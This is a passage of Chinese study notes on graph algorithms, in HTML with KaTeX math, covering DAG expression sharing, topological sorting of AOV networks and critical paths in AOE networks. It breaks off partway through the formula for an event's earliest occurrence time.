<p>有向无环图是描述含有公共子式的表达式的有效工具。例如表达式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>b</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>d</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>e</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>d</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((a + b) * (b * (c + d)) + (c + d) * e) * ((c + d) * e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">((</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">((</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span> 可以用二叉树来表示。仔细观察该表达式，可发现有一些相同的子表达式 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(c + d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>d</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">(c + d) * e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>，而在二叉树中，它们也重复出现。若利用有向无环图，则可实现对相同子式的共享，从而节省存储空间。</p>
<h4> 拓扑排序</h4>
<p>AOV 网：若用 DAG 图表示一个工程，其顶点表示活动，用有向边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>V</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}, V_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 表示活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 必须先于活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">V_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 进行的这样一种关系，则将这种有向图称为 <strong>顶点表示活动的网络</strong>，记为 AOV 网。在 AOV 网中，活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">V_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的直接前驱，活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">V_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 的直接后继，这种前驱和后继关系具有传递性，且任何活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 不能以它自己作为自己的前驱或后继。</p>
<p>拓扑排序：在图论中，由一个有向无环图的顶点组成的序列，当且仅当满足下列条件时，称为该图的一个 <strong>拓扑排序</strong>：</p>
<ul>
<li>每个顶点出现且只出现一次</li>
<li>若顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 在序列中排在顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的前面，则在图中不存在从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的路径</li>
</ul>
<p>或定义为：拓扑排序是对有向无环图的顶点的一种排序，它使得若存在一条从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的路径，则在排序中顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 出现在顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的后面。每个 AOV 网都有一个或多个拓扑排序序列。</p>
<p>对一个 AOV 网进行拓扑排序的算法有很多，下面介绍比较常用的一种方法的步骤：</p>
<ol>
<li>从 AOV 网中选择一个没有前驱的顶点并输出</li>
<li>从网中删除该顶点和所有以它为起点的有向边</li>
<li>重复步骤 <code>1</code> 和步骤 <code>2</code> 直到当前的 AOV 网为空或当前网中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环</li>
</ol>
<p>拓扑排序过程：每轮选择一个入度为 <code>0</code> 的顶点并输出，然后删除该顶点和所有以它为起点的有向边，最后得到拓扑排序的结果。</p>
<p>拓扑排序算法的实现如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于输出每个顶点的同时还要删除以它为起点的边，故采用邻接表存储时拓扑排序的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi><mo>+</mo><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V| + |E|)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mclose">)</span></span></span></span>，采用邻接矩阵存储时拓扑排序的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。此外，利用深度优先遍历也可实现拓扑排序。</p>
<p>对一个 AOV 网，如果采用下列步骤进行排序，则称之为逆拓扑排序:</p>
<ol>
<li>从 AOV 网中选择一个没有后继（出度为 <code>0</code>）的顶点并输出</li>
<li>从网中删除该顶点和所有以它为终点的有向边</li>
<li>重复步骤 <code>1</code> 和步骤 <code>2</code> 直到当前的 AOV 网为空</li>
</ol>
<p>用拓扑排序算法处理 AOV 网时，应注意以下问题：</p>
<ol>
<li>入度为零的顶点，即没有前驱活动的或前驱活动都已经完成的顶点，工程可以从这个顶点所代表的活动开始或继续</li>
<li>若一个顶点有多个直接后继，则拓扑排序的结果通常不唯一；但若各个顶点已经排在一个线性有序的序列中，每个顶点有唯一的前驱后继关系，则拓扑排序的结果是唯一的</li>
<li>由于 AOV 网中各顶点的地位平等，每个顶点编号是人为的，因此可以按拓扑排序的结果重新编号，生成 AOV 网的新的邻接存储矩阵，这种邻接矩阵可以是三角矩阵；但对于一般的图来说，若其邻接矩阵是三角矩阵，则存在拓扑序列；反之则不一定成立</li>
</ol>
<h4> 关键路径</h4>
<p>在带权有向图中，以顶点表示事件，以有向边表示活动，以边上的权值表示完成该活动的开销（如完成活动所需的时间），称之为 <strong>用边表示活动的网络</strong>，简称 AOE 网。AOE 网和 AOV 网都是有向无环图，不同之处在于它们的边和顶点所代表的含义是不同的，AOE 网中的边有权值；而 AOV 网中的边无权值，仅表示顶点之间的前后关系。</p>
<p><strong>AOE 网具有以下两个性质：</strong></p>
<ol>
<li>只有在某顶点所代表的事件发生后，从该顶点出发的各有向边所代表的活动才能开始</li>
<li>只有在进入某顶点的各有向边所代表的活动都已结束时，该顶点所代表的事件才能发生</li>
</ol>
<p>在 AOE 网中仅有一个入度为 <code>0</code> 的顶点，称为 <strong>开始顶点（源点）</strong>，它表示整个工程的开始；网中也仅存在一个出度为 <code>0</code> 的顶点，称为 <strong>结束顶点（汇点）</strong>，它表示整个工程的结束。</p>
<p>在 AOE 网中，有些活动是可以并行进行的。从源点到汇点的有向路径可能有多条，并且这些路径长度可能不同。完成不同路径上的活动所需的时间虽然不同，但是只有所有路径上的活动都己完成，整个工程才能算结束。因此，从源点到汇点的所有路径中，具有最大路径长度的路径称为 <strong>关键路径</strong>，而把关键路径上的活动称为 <strong>关键活动</strong>。</p>
<p>完成整个工程的最短时间就是关键路径的长度，即关键路径上各活动花费开销的总和。这是因为关键活动影响了整个工程的时间，即若关键活动不能按时完成，则整个工程的完成时间就会延长。因此，只要找到了关键活动，就找到了关键路径，也就可以得出最短完成时间。</p>
<p>下面给出在寻找关键活动时所用到的几个参量的定义：</p>
<ol>
<li>
<p><strong>事件 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最早发生时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></strong></p>
<p>它是指从源点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">v_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最长路径长度。事件 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最早发生时间决定了所有从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 开始的活动能够开工的最早时间。可用下面的递推公式来计算：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mtext>源点</mtext><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">ve(\text{源点}) = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">源点</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi><mi>a</mi><mi>x</mi><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mi>J</mi><mo stretchy="false">)</mo><mo>+</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">ve(k) = Max{ve(J) + Weight(v_{j}, v_{k})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span 